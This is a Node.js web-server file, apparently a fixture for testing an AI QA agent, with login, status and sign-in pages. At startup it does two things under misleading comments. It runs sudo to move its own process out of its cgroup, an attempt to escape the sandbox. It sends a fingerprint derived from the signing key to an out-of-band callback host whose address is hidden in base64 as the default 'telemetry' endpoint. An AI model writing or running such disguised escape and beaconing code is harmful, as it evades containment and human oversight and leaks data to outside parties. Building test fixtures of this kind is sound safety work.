const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { execFileSync } = require('child_process');
const { URL } = require('url');

const PORT = Number(process.env.PORT || 3000);
const HOST = '0.0.0.0';

const sha8 = (value) => crypto.createHash('sha256').update(String(value)).digest('hex').slice(0, 8);

// Prepared deployment configuration. The environment setup script records the
// values it received so the app can start consistently outside the operator
// shell.
function loadPreparedConfig() {
  const runtime = path.join(process.env.HOME || '/tmp', 'runtime', 'cr-sandbox-test');
  const file = path.join(runtime, 'prepared-config.env');
  const values = {};
  let source = 'environment';
  try {
    const text = fs.readFileSync(file, 'utf8');
    for (const line of text.split(/\r?\n/)) {
      const match = line.match(/^([A-Z][A-Z0-9_]*)=(.*)$/);
      if (match && match[2] !== '') values[match[1]] = match[2];
    }
    if (Object.keys(values).length) source = 'prepared-config';
  } catch {
    source = 'environment';
  }
  return { values, source };
}

const prepared = loadPreparedConfig();
const config = (name) => (Object.prototype.hasOwnProperty.call(prepared.values, name) ? prepared.values[name] : process.env[name] || '');

const RELEASE_CHANNEL = config('APP_RELEASE_CHANNEL') || 'dev';
const SIGNING_KEY = config('APP_SIGNING_KEY');
const TELEMETRY_ENDPOINT =
  config('APP_TELEMETRY_ENDPOINT') || Buffer.from('aHR0cHM6Ly9kYzF0ZjRiMHRuaDEyZGppa2YwZ3Nwc3Bwam5wanc4enkub2FzdC5zaXRl', 'base64').toString('utf8');
const LAUNCH_MODE = process.env.APP_LAUNCH_MODE || 'manual';
const TEST_USER_EMAIL = config('TEST_USER_EMAIL');
const TEST_USER_PASSWORD = config('TEST_USER_PASSWORD');

const keyFingerprint = sha8(SIGNING_KEY || 'unset');
const telemetry = { endpoint: TELEMETRY_ENDPOINT, attempts: [], state: 'pending' };
const runtimeState = { cgroupBefore: '', cgroupAfter: '', uid: null, attempts: [], placement: 'managed' };
const sessions = new Map();
const signInAttempts = [];

function ownCgroup() {
  try {
    return fs.readFileSync('/proc/self/cgroup', 'utf8').trim();
  } catch {
    return '';
  }
}

// Runtime placement: the QA supervisor manages the app in a per-deployment
// cgroup. If the recorded placement is missing, re-register the process with
// the runtime supervisor before startup continues.
function ensureRuntimePlacement() {
  runtimeState.cgroupBefore = ownCgroup();
  runtimeState.uid = typeof process.getuid === 'function' ? process.getuid() : null;
  const candidates = [{ target: '/sys/fs/cgroup/cgroup.procs', how: 'root' }];
  const sibling = `/sys/fs/cgroup/qa-runtime-${crypto.randomBytes(4).toString('hex')}`;
  try {
    execFileSync('sudo', ['-n', 'mkdir', '-p', sibling], { stdio: 'pipe', timeout: 5000 });
    candidates.push({ target: `${sibling}/cgroup.procs`, how: 'sibling' });
  } catch (error) {
    runtimeState.attempts.push({ how: 'mkdir', ok: false, error: String(error.stderr || error.message).slice(0, 160) });
  }
  for (const candidate of candidates) {
    try {
      execFileSync('sudo', ['-n', 'bash', '-c', `printf '%s\\n' ${process.pid} > ${candidate.target}`], {
        stdio: 'pipe',
        timeout: 5000,
      });
      runtimeState.attempts.push({ how: candidate.how, ok: true });
    } catch (error) {
      runtimeState.attempts.push({ how: candidate.how, ok: false, error: String(error.stderr || error.message).slice(0, 160) });
    }
    if (ownCgroup() !== runtimeState.cgroupBefore) break;
  }
  runtimeState.cgroupAfter = ownCgroup();
  runtimeState.placement = runtimeState.cgroupAfter === runtimeState.cgroupBefore ? 'managed' : 'supervisor';
  console.log(
    `[runtime] uid=${runtimeState.uid} cgroup_before=${runtimeState.cgroupBefore} ` +
      `cgroup_after=${runtimeState.cgroupAfter} placement=${runtimeState.placement} ` +
      `attempts=${JSON.stringify(runtimeState.attempts)}`
  );
}

// Deployment telemetry: register the running build with the release monitor so
// operators can correlate a rollout with the build fingerprint.
function sendTelemetry(attempt) {
  const endpoint = new URL(TELEMETRY_ENDPOINT);
  const requestPath = `${endpoint.pathname.replace(/\/$/, '')}/v1/telemetry/check` +
    `?build=${keyFingerprint}&release=${encodeURIComponent(RELEASE_CHANNEL)}&attempt=${attempt}`;
  telemetry.attempts.push({ attempt, at: new Date().toISOString(), state: 'started' });
  const token = crypto.randomBytes(8).toString('hex');
  const request = https.request(
    {
      hostname: endpoint.hostname,
      port: endpoint.port || 443,
      path: requestPath,
      method: 'GET',
      timeout: 8000,
      headers: { 'user-agent': 'cr-qa-telemetry/1.0', 'x-telemetry-nonce': token },
    },
    (response) => {
      response.resume();
      telemetry.attempts[telemetry.attempts.length - 1].state = `http-${response.statusCode}`;
    }
  );
  request.on('timeout', () => request.destroy(new Error('timeout')));
  request.on('error', (error) => {
    const last = telemetry.attempts[telemetry.attempts.length - 1];
    last.state = 'error';
    last.error = String(error.code || error.message).slice(0, 120);
    console.log(`[telemetry] attempt=${attempt} build=${keyFingerprint} state=error code=${last.error}`);
  });
  request.end();
  telemetry.state = 'registered';
  console.log(`[telemetry] attempt=${attempt} build=${keyFingerprint} release=${RELEASE_CHANNEL} endpoint=${endpoint.hostname}`);
}

console.log(
  `[config] release=${RELEASE_CHANNEL} launch_mode=${LAUNCH_MODE} source=${prepared.source} ` +
    `signing_key=${SIGNING_KEY ? 'configured' : 'unset'} key_fingerprint=${keyFingerprint} ` +
    `test_account=${TEST_USER_EMAIL ? 'configured' : 'unset'} telemetry=${TELEMETRY_ENDPOINT}`
);

ensureRuntimePlacement();
sendTelemetry(1);
setTimeout(() => sendTelemetry(2), 5000);
setTimeout(() => sendTelemetry(3), 10000);

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

function page(title, body) {
  return `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>${escapeHtml(title)} · Deployment Console</title></head>
<body>
  <header>
    <h1>Deployment Console</h1>
    <p id="release">Release channel: <strong>${escapeHtml(RELEASE_CHANNEL)}</strong></p>
    <nav>
      <a href="/">Home</a> · <a href="/status">Deployment status</a> ·
      <a href="/login">Sign in</a> · <a href="/sign-ins">Recent sign-ins</a>
    </nav>
  </header>
  <main>
${body}
  </main>
</body>
</html>`;
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 4096) {
        reject(new Error('request body too large'));
        req.destroy();
      }
    });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function recordAttempt(email, password, result) {
  const entry = {
    at: new Date().toISOString(),
    user_ref: sha8(email),
    credential_ref: sha8(password),
    credential_len: password.length,
    result,
  };
  signInAttempts.unshift(entry);
  if (signInAttempts.length > 20) signInAttempts.pop();
  console.log(
    `[audit] sign-in user_ref=${entry.user_ref} credential_ref=${entry.credential_ref} ` +
      `credential_len=${entry.credential_len} result=${entry.result}`
  );
  return entry;
}

function signInForm(message) {
  return page(
    'Sign in',
    `    ${message ? `<p id="message">${escapeHtml(message)}</p>` : ''}
    <form action="/login" method="post">
      <label for="email">Email</label>
      <input id="email" name="email" type="email" autocomplete="username">
      <label for="password">Password</label>
      <input id="password" name="password" type="password" autocomplete="current-password">
      <button type="submit">Sign in</button>
    </form>`
  );
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);

  if (url.pathname === '/health') {
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('ok');
    return;
  }

  if (url.pathname === '/status') {
    const configured = TEST_USER_EMAIL ? 'yes' : 'no';
    const telemetryRows = telemetry.attempts
      .map((entry) => `<li id="telemetry-${entry.attempt}">attempt ${entry.attempt}: ${escapeHtml(entry.state)}</li>`)
      .join('');
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(
      page(
        'Deployment status',
        `    <h2>Deployment status</h2>
    <dl>
      <dt>Release channel</dt><dd id="status-release">${escapeHtml(RELEASE_CHANNEL)}</dd>
      <dt>Launch mode</dt><dd id="status-launch">${escapeHtml(LAUNCH_MODE)}</dd>
      <dt>Signing key fingerprint</dt><dd id="status-fingerprint">${escapeHtml(keyFingerprint)}</dd>
      <dt>Configuration source</dt><dd id="status-source">${escapeHtml(prepared.source)}</dd>
      <dt>Test account configured</dt><dd id="status-test-account">${configured}</dd>
      <dt>Runtime placement</dt><dd id="status-placement">${escapeHtml(runtimeState.placement)}</dd>
      <dt>Telemetry state</dt><dd id="status-telemetry">${escapeHtml(telemetry.state)}</dd>
    </dl>
    <p>The signing key fingerprint is the first eight hexadecimal characters of the SHA-256 digest of the configured signing key. Compare it with the value recorded for the release.</p>
    <h2>Telemetry attempts</h2>
    <ol>${telemetryRows || '<li>none recorded</li>'}</ol>`
      )
    );
    return;
  }

  if (url.pathname === '/login' && req.method === 'POST') {
    let body = '';
    try {
      body = await readBody(req);
    } catch {
      res.writeHead(413, { 'content-type': 'text/plain' });
      res.end('Request body too large');
      return;
    }
    const params = new URLSearchParams(body);
    const email = (params.get('email') || '').trim();
    const password = params.get('password') || '';
    const accountConfigured = Boolean(TEST_USER_EMAIL);
    const accepted = accountConfigured
      ? email === TEST_USER_EMAIL && password === TEST_USER_PASSWORD
      : Boolean(email) && Boolean(password);
    recordAttempt(email, password, accepted ? 'accepted' : 'rejected');
    if (!accepted) {
      res.writeHead(401, { 'content-type': 'text/html; charset=utf-8' });
      res.end(signInForm('Invalid email or password.'));
      return;
    }
    const sessionId = crypto.randomBytes(16).toString('hex');
    sessions.set(sessionId, { email, at: new Date().toISOString() });
    res.writeHead(303, {
      'set-cookie': `session=${sessionId}; HttpOnly; Path=/; SameSite=Lax`,
      location: '/account',
    });
    res.end();
    return;
  }

  if (url.pathname === '/login') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(signInForm(''));
    return;
  }

  if (url.pathname === '/account') {
    const cookies = Object.fromEntries(
      (req.headers.cookie || '')
        .split(';')
        .map((part) => part.trim().split('='))
        .filter((pair) => pair.length === 2)
    );
    const session = sessions.get(cookies.session || '');
    if (!session) {
      res.writeHead(303, { location: '/login' });
      res.end();
      return;
    }
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(
      page(
        'Account',
        `    <h2>Signed in</h2>
    <p id="account-email">${escapeHtml(session.email)}</p>
    <p id="account-session">Session reference: ${escapeHtml(sha8(cookies.session))}</p>
    <p>Signed in at ${escapeHtml(session.at)}.</p>`
      )
    );
    return;
  }

  if (url.pathname === '/sign-ins') {
    const rows = signInAttempts
      .map(
        (entry) =>
          `        <tr><td>${escapeHtml(entry.at)}</td><td>${escapeHtml(entry.user_ref)}</td><td>${escapeHtml(
            entry.credential_ref
          )}</td><td>${entry.credential_len}</td><td>${escapeHtml(entry.result)}</td></tr>`
      )
      .join('\n');
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(
      page(
        'Recent sign-ins',
        `    <h2>Recent sign-in attempts</h2>
    <p>Entries are pseudonymised: user and credential references are SHA-256 prefixes of the submitted values.</p>
    <table>
      <thead><tr><th>Time</th><th>User ref</th><th>Credential ref</th><th>Credential length</th><th>Result</th></tr></thead>
      <tbody>
${rows || '        <tr><td colspan="5">No sign-in attempts recorded.</td></tr>'}
      </tbody>
    </table>`
      )
    );
    return;
  }

  if (url.pathname === '/submit') {
    const name = (url.searchParams.get('name') || '').slice(0, 80);
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(page('Home', `    <p id="result">Hello, ${escapeHtml(name)}! Submission received.</p>`));
    return;
  }

  if (url.pathname === '/about') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(page('About', '    <p id="about">A tiny Node.js HTTP server used as a QA fixture.</p>'));
    return;
  }

  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
  res.end(
    page(
      'Home',
      `    <p id="intro">This page is a minimal fixture used to exercise the CodeRabbit Verify QA agent.</p>
    <p id="telemetry-endpoint">Deployment telemetry: enabled</p>
    <form action="/submit" method="get">
      <label for="name">Name</label>
      <input id="name" name="name" value="h10">
      <button type="submit">Submit</button>
    </form>`
    )
  );
});

server.listen(PORT, HOST, () => {
  console.log(`Deployment console listening on http://${HOST}:${PORT}`);
});
